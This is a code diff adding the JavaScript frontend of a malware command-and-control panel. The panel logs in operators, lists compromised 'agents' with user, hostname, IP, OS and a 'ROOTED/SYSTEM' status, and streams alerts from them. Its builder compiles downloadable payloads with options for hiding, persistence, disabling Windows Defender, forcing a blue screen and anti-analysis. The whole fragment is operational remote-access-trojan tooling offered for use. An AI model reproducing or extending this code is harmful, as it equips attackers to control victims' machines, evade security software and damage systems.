+            localStorage.removeItem('baron_token');
+            socket.disconnect();
+            location.reload();
+        }
+
+        // Auto-login check
+        if(token) {
+            fetch('/api/panel/check', { headers: { 'X-Token': token }})
+            .then(r => r.json())
+            .then(d => { if(d.ok) enterWorkspace(); else localStorage.removeItem('baron_token'); });
+        }
+
+        // --- 7. Networking & Socket ---
+        function initSocket() {
+            socket = io({ auth: { token: token } });
+            
+            socket.on('connect', () => {
+                document.getElementById('island-text').innerText = "C2 SECURE UPLINK";
+                logTerminal("Socket connected to Mainframe.", "succ");
+            });
+            
+            socket.on('disconnect', () => {
+                document.getElementById('island-text').innerText = "UPLINK LOST";
+                document.querySelector('.island-dot').style.background = "var(--danger)";
+                document.querySelector('.island-dot').style.boxShadow = "var(--danger)";
+                logTerminal("Socket disconnected.", "err");
+            });
+
+            socket.on('clients_update', data => {
+                renderClients(data);
+            });
+
+            socket.on('new_log', data => {
+                logTerminal(`[${data.ip}] ${data.msg}`, data.level === 'INFO' ? 'info' : 'warn');
+            });
+            
+            socket.on('new_alert', data => {
+                flashIsland(`ALERT: ${data.msg}`);
+                logTerminal(`ALERT: ${data.msg}`, 'err');
+            });
+        }
+
+        function fetchClients() {
+            fetch('/api/panel/clients', { headers: { 'X-Token': token }})
+            .then(r => r.json())
+            .then(d => { if(d.ok) renderClients(d.clients); });
+        }
+
+        function renderClients(data) {
+            const tbody = document.getElementById('clients-body');
+            tbody.innerHTML = '';
+            
+            const entries = Object.entries(data);
+            if(entries.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:var(--text-muted)">No connected agents (Ghost Town)</td></tr>`;
+                return;
+            }
+            
+            const now = Date.now()/1000;
+            entries.forEach(([id, c]) => {
+                const diff = now - c.last_seen;
+                const isOnline = diff < 15;
+                const statusClass = isOnline ? 'status-online' : 'status-offline';
+                const statusTxt = isOnline ? 'ONLINE' : 'DEAD';
+                
+                // OS Icon logic
+                let icon = 'fa-windows';
+                if(c.os.toLowerCase().includes('linux')) icon = 'fa-linux';
+                
+                let integrity = "SECURE";
+                if(c.admin) integrity = "<span style='color:var(--danger)'>ROOTED/SYSTEM</span>";
+
+                const tr = document.createElement('tr');
+                tr.dataset.id = id;
+                tr.innerHTML = `
+                    <td style="font-family:var(--font-mono); font-size: 0.8rem; color:var(--text-muted)">${id.substring(0,8)}</td>
+                    <td><b>${c.user}</b> @ ${c.hostname}</td>
+                    <td style="font-family:var(--font-mono)">${c.ip}</td>
+                    <td><i class="fa-brands ${icon} os-icon"></i> ${c.os}</td>
+                    <td>${integrity}</td>
+                    <td><div class="status-badge ${statusClass}"><div style="width:6px;height:6px;border-radius:50%;background:currentColor"></div>${statusTxt}</div></td>
+                `;
+                tbody.appendChild(tr);
+            });
+            
+            attachContextMenu(); // Rebind right click
+        }
+
+        // --- 8. Builder Logic ---
+        function compilePayload() {
+            const btn = document.getElementById('btn-build');
+            btn.innerText = "COMPILING (010110)...";
+            btn.disabled = true;
+            
+            const payload = {
+                server: document.getElementById('b-url').value,
+                beacon: document.getElementById('b-beacon').value,
+                hide: document.getElementById('b-hide').checked,
+                persist: document.getElementById('b-persist').checked,
+                defender: document.getElementById('b-defend').checked,
+                bsod: document.getElementById('b-bsod').checked,
+                anti: document.getElementById('b-anti').checked
+            };
+
+            fetch('/api/panel/build', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Token': token },
+                body: JSON.stringify(payload)
+            }).then(r => r.json()).then(d => {
+                if(d.ok) {
+                    btn.innerText = "DOWNLOAD PAYLOAD";
+                    btn.classList.add('status-online');
+                    setTimeout(() => { btn.classList.remove('status-online'); btn.innerText="Compile Binary"; btn.disabled=false; }, 3000);
+                    // Trigger download
+                    window.location = d.source.download_url;
+                    logTerminal(`Payload generated successfully: ${d.source.name}`, 'succ');
+                } else {
+                    btn.innerText = "ERROR - CHECK LOGS";
+                    btn.disabled = false;
+                    logTerminal(`Build Failed: ${d.error}`, 'err');
+                }
+            }).catch(e => {
+                btn.innerText = "NETWORK ERROR"; btn.disabled = false;
+            });
+        }
+
+        // --- 9. UX Visuals ---
+        function flashIsland(msg) {
+            const isl = document.getElementById('dynamic-island');
+            const txt = document.getElementById('island-text');
+            const old = txt.innerText;
+            isl.style.background = "var(--danger)";
+            txt.innerText = msg;
+            setTimeout(() => {
+                isl.style.background = "#000";
+                txt.innerText = old;
+            }, 3000);
+        }
+
+        function toggleIsland() {
+            const isl = document.getElementById('dynamic-island');
+            isl.classList.toggle('expanded');
+        }
+
+    </script>
 </body>
 </html>
